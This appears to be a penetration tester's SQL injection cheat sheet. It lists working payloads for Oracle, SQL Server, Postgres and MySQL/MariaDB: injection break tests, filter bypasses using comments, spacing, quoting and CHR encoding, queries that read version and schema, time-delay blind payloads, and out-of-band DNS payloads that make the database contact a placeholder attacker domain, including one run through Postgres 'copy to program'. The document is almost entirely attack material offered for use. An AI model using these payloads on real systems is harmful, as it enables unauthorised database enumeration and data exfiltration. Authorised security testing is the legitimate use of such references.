# Sql Injection
*Exploit [[3. Methodology/3.2 Exploitation/SQL Injection]]*
## Quick Tests
**Check if input breaks request**
- `-- -`
- `#`
- String -> `||<SLEEP>`
- Integer -> `<SLEEP>`
## Bypass
### Trailing Data with Comments
- Oracle / Microsoft / Postgres - `--COMMENT` `/*COMMENT*/`
- MySQL / MariaDB - `#COMMENT` `-- COMMENT` `/*COMMENT*/`

### Spaces
- Postgres / MySQL / MariaDB - `--SELECT/**/1`

### Quotes
- Postgres - `SELECT $$<COLUMN>$$`

### Keywords
- Postgres - `CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72);`

## POC
### Database Name / Version
- Oracle - `SELECT banner FROM v$version` `SELECT version FROM v$instance`
- Microsoft / MySql / MariaDB - `SELECT @@version`
- Postgres - `SELECT version()`

### Dumping Table / Column Names
- Oracle - `SELECT * FROM all_tables` `SELECT * FROM all_tab_columns WHERE table_name = <TABLE>`
- Microsoft / Postgres / MySql / MariaDB - `SELECT * FROM information_schema.tables` `SELECT * FROM information_schema.columns WHERE table_name = <TABLE>`

## Blind POC
### Time Delays (Blind Injection)
*Exploit [[3. Methodology/3.2 Exploitation/SQL Injection#Conditionals]]*
- Oracle - `dbms_pipe.receive_message(('a'),10)`
- Microsoft - `WAITFOR DELAY '0:0:10'`
- Postgres - `pg_sleep(10)`
- MySql / MariaDB - `sleep(10)`

### DNS Lookup (Blind Injection)
*Exploit [[3. Methodology/3.2 Exploitation/SQL Injection#DNS with Data Exfiltration]]*
- Oracle (v11.2.0.3 - v12.1.0.2) - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "<URL>/"> %remote;]>'),'/l') FROM dual`
- Oracle (Elevated privileges) - `SELECT UTL_INADDR.get_host_address('<DOMAIN>')`
- Microsoft - `exec master..xp_dirtree '//<DOMAIN>/a'`
- Postgres - `copy (SELECT '') to program 'nslookup <DOMAIN>'`
- MySql / MariaDB (Windows only) - `LOAD_FILE('\\\\<DOMAIN>\\a')` `SELECT ... INTO OUTFILE '\\\\<DOMAIN>\a'`


# MongoDB
** Safe from traditional attacks, from building a BSON object, instead of assembling a query from string **
** Look for JSON requests **
